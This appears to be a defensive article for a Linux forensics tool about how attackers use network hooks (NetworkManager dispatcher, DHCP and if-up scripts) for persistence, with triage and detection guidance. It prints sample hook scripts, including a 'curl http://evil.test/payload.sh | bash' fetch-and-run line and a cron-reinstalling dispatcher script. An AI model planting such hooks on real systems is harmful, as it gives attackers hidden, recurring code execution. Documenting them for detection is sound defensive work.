# Network Hook Persistence

## Overview

Network hook persistence refers to abuse of Linux networking-related configuration and event-driven mechanisms to trigger code execution when network conditions change.

Rather than relying on:

- system boot  
- user login  
- scheduled execution  

network hook persistence leverages:

- interface state changes  
- DHCP events  
- NetworkManager events  
- systemd-networkd events  

> **The network becomes the execution trigger.**

This allows attackers to tie execution to real-world conditions such as:

- connecting to a network  
- obtaining an IP address  
- bringing an interface up or down  

---

## Why Attackers Use Network Hooks for Persistence

Attackers use network-based hooks because they provide:

- Event-driven execution (not time-based or login-based)  
- Execution triggered by normal system behavior  
- Stealthy persistence tied to network activity  
- Strong relevance on laptops, mobile systems, and rotating environments  
- A mechanism that is often overlooked in standard triage  

Network hooks are especially effective on:

- laptops moving between networks  
- developer systems  
- administrative workstations  
- cloud systems with dynamic networking  

---

## Execution Semantics

Network hook persistence is implemented through multiple subsystems depending on the Linux distribution and configuration.

Common mechanisms include:

- NetworkManager dispatcher scripts  
- DHCP client hooks  
- ifup/ifdown scripts  
- systemd-networkd hooks  

These mechanisms typically execute scripts when:

- an interface comes up  
- an interface goes down  
- a DHCP lease is obtained or renewed  
- connectivity state changes  

---

## Common Hook Locations

### NetworkManager Dispatcher

```text
/etc/NetworkManager/dispatcher.d/
```

Scripts in this directory are executed on network state changes.

---

### DHCP Client Hooks

```text
/etc/dhcp/dhclient-enter-hooks.d/
/etc/dhcp/dhclient-exit-hooks.d/
```

Triggered during DHCP lease events.

---

### Ifup/Ifdown Hooks (Legacy)

```text
/etc/network/if-up.d/
/etc/network/if-down.d/
```

Triggered when interfaces change state.

---

### systemd-networkd Hooks

```text
/usr/lib/systemd/network/
/etc/systemd/network/
```

While not always script-based, these configurations can reference execution behavior tied to network events.

---

## Privilege Requirements

Most network hook locations require:

- root or elevated privileges to modify  

This means attackers typically deploy this persistence:

- after privilege escalation  
- during post-exploitation  

However, some user-level NetworkManager configurations may allow limited user-scope persistence.

---

## Why This Mechanism Is So Effective

Network hook persistence is powerful because it:

- does not rely on user interaction  
- does not require system reboot  
- executes under real-world conditions  
- can trigger repeatedly but irregularly  

Unlike cron:
- not time-based  

Unlike autostart:
- not login-based  

Unlike systemd:
- not strictly boot-based  

> **Execution is tied to network state, which is both frequent and unpredictable.**

---

## Common Attacker Tradecraft

### 1. NetworkManager Dispatcher Script Execution

Target file:

```text
/etc/NetworkManager/dispatcher.d/99-update
```

Example contents:

```bash
#!/bin/bash

if [ "$2" = "up" ]; then
    /tmp/net.sh
fi
```

Execution flow:
1. Attacker gains root access  
2. Drops script into dispatcher directory  
3. Interface comes up (e.g., Wi-Fi connection)  
4. Script executes automatically  
5. Payload runs from `/tmp/net.sh`  

Why attackers use this:
- Executes on every network connection  
- Easy to deploy  
- Highly reliable on desktop systems  

---

### 2. DHCP Hook Script Execution

Target file:

```text
/etc/dhcp/dhclient-exit-hooks.d/update.sh
```

Example contents:

```bash
#!/bin/bash
/tmp/dhcp.sh
```

Execution flow:
1. Attacker places script in DHCP hook directory  
2. System obtains or renews DHCP lease  
3. Hook executes automatically  
4. Payload runs  

Why attackers use this:
- Tied directly to network acquisition  
- Executes frequently in dynamic environments  
- Often overlooked in analysis  

---

### 3. If-Up Hook Execution

Target file:

```text
/etc/network/if-up.d/monitor
```

Example contents:

```bash
#!/bin/bash
/usr/local/bin/.netmon
```

Execution flow:
1. Attacker installs script in if-up directory  
2. Interface transitions to “up” state  
3. Script executes automatically  
4. Payload runs  

Why attackers use this:
- Works on systems using legacy networking  
- Executes reliably on interface changes  
- Blends with existing hook scripts  

---

### 4. Inline Network-Based Payload Retrieval

Target file:

```text
/etc/NetworkManager/dispatcher.d/98-net
```

Example contents:

```bash
#!/bin/bash

if [ "$2" = "up" ]; then
    curl http://evil.test/payload.sh | bash
fi
```

Execution flow:
1. Attacker places dispatcher script  
2. Network connection occurs  
3. Script triggers  
4. Remote payload is fetched and executed  

Why attackers use this:
- No persistent payload required locally  
- Flexible command-and-control  
- Reduces forensic footprint  

---

### 5. Re-Establishing Persistence on Network Events

Target file:

```text
/etc/NetworkManager/dispatcher.d/97-restore
```

Example contents:

```bash
#!/bin/bash

if [ "$2" = "up" ]; then
    echo "* * * * * /tmp/run.sh" >> /etc/crontab
fi
```

Execution flow:
1. Attacker installs dispatcher script  
2. Network reconnect occurs  
3. Script restores cron persistence  
4. Attacker regains recurring execution  

Why attackers use this:
- Uses network as recovery trigger  
- Restores removed persistence mechanisms  
- Forces defenders to clean multiple layers  

---

### 6. Hidden Payload Execution from Temporary Path

Target file:

```text
/etc/network/if-up.d/dbus-update
```

Example contents:

```bash
#!/bin/bash
/tmp/.cache/dbus
```

Execution flow:
1. Payload stored in hidden temp path  
2. Hook script references payload  
3. Interface state changes  
4. Payload executes silently  

Why attackers use this:
- Keeps payload separate from hook  
- Easy to update payload  
- Reduces script complexity  

---

### 7. Masquerading as Legitimate Network Script

Target file:

```text
/etc/NetworkManager/dispatcher.d/90-dbus
```

Example contents:

```bash
#!/bin/bash
/usr/libexec/dbus-helper
```

Execution flow:
1. Attacker names script to resemble legitimate component  
2. Script is placed among real dispatcher scripts  
3. Network event triggers execution  
4. Malicious binary runs  

Why attackers use this:
- Blends into legitimate system files  
- Naming reduces suspicion  
- Harder to spot during quick triage  

---

### 8. Multi-Stage Execution Triggered by Network State

Example chain:
- dispatcher script executes `/tmp/stage1.sh`
- stage1 downloads stage2
- stage2 establishes C2 and persistence

Execution flow:
1. Network connection occurs  
2. Hook script triggers stage 1  
3. Stage 1 retrieves additional payload  
4. Stage 2 executes attacker objectives  

Why attackers use this:
- Flexible staging  
- Reduces static footprint  
- Adapts to network availability  

---

## What Normal Looks Like

Legitimate network hook usage typically includes:

- interface configuration scripts  
- DNS updates  
- routing adjustments  
- logging or monitoring scripts  

Normal scripts:

- reference system binaries  
- are package-managed or documented  
- align with network configuration needs  
- do not execute arbitrary payloads  

---

## What Malicious Use Looks Like

### High-Signal Indicators

- execution from:
  - `/tmp`
  - `/var/tmp`
  - `/dev/shm`
- scripts using:
  - `curl`
  - `wget`
  - `bash -c`
- unknown scripts in hook directories  
- recently created hook files  
- hidden payload references  

### Medium-Signal Indicators

- unusual script names  
- scripts not tied to network configuration  
- scripts launching background processes  

### Low-Signal Indicators

- legitimate DHCP hooks  
- system-provided dispatcher scripts  
- vendor network utilities  

---

## ATT&CK Mapping

Relevant ATT&CK techniques include:

- **T1037 – Boot or Logon Initialization Scripts**
- **T1053 – Scheduled Task/Job** (conceptual overlap for triggered execution)

While not always explicitly categorized, network-triggered execution aligns with event-based persistence and execution mechanisms.

---

## Why Analysts Miss This Technique

### 1. Focus on Boot and Login

Analysts often focus on:
- systemd  
- cron  
- autostart  

Network hooks fall outside those categories.

### 2. Less Familiar Paths

Directories like:

```text
/etc/NetworkManager/dispatcher.d/
```

are not always part of standard triage.

### 3. Event-Driven Nature

Execution does not happen immediately:
- it depends on network state  
- may appear inconsistent  

### 4. Blending with Legitimate Scripts

Hook scripts often look similar to legitimate configuration scripts.

---

## Deep Analytical Guidance

### Key Question

> Is code being executed as a result of a network event that should not be happening?

---

### Focus Areas

#### 1. Hook Directories

Inspect all known hook paths:
- NetworkManager  
- DHCP  
- if-up/if-down  

#### 2. Script Behavior

- Does it execute external payloads?  
- Does it reference temporary paths?  
- Does it perform network communication?  

#### 3. Execution Conditions

- When does it trigger?  
- Does it depend on interface state or DHCP events?  

#### 4. Naming and Placement

- Does the script name match its function?  
- Does it resemble legitimate system components?  

---

## Triage Workflow

1. Inspect hook directories:

```text
ls -la /etc/NetworkManager/dispatcher.d/
ls -la /etc/dhcp/
ls -la /etc/network/
```

2. Review script contents  

3. Check permissions and ownership  

4. Validate referenced binaries  

5. Correlate with:
- network events  
- process execution  
- system logs  

---

## Evidence to Preserve

- hook scripts  
- referenced payloads  
- file metadata  
- network logs  
- execution artifacts tied to network changes  

---

## Why Tenax Checks This Surface

Tenax checks network hooks because they are:

- event-driven execution mechanisms  
- highly stealthy  
- often overlooked  
- effective for persistence and re-entry  

They are particularly useful in environments where:

- systems frequently reconnect to networks  
- users move between locations  
- dynamic networking is common  

> Network hooks allow attackers to execute code when the system connects to the world — not just when it starts or when a user logs in.

---

## Key Takeaway

Network hook persistence is execution tied to network state changes.

> The attacker does not rely on time or user behavior — they rely on connectivity itself to trigger their code.
